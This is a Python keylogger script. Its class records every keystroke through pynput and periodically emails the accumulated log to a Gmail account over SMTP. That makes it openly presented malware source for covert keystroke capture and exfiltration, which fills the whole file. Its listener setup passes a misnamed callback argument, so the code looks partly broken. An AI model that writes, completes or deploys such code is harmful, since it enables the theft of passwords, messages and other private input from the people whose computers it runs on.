
import smtplib
import threading
from pynput import keyboard


class KeyLogger:
    def __init__(self, timeInterval, email, password):
        self.interval = timeInterval
        self.log = "The Kelloger has started running..."
        self.email = email
        self.password = password

    def appendToLog(self, string):
        self.log = self.log+string

    def onPress(self, key):
        try:
            currentKey = str(key.char)
        except AttributeError:
            if key == key.space:
                currentKey = " "
            elif key == key.esc:
                print("Currently exiting the program...")
                return False
            else:
                currentKey = " "+str(key)+" "
        self.appendToLog(currentKey)

    def sendMail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def reportAndSend(self):
        send_off = self.sendMail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.reportAndSend)
        timer.start()

    def start(self):
        keyboardListener = keyboard.Listener(onPress=self.onPress)
        with keyboardListener:
            self.reportAndSend()
            keyboardListener.join()
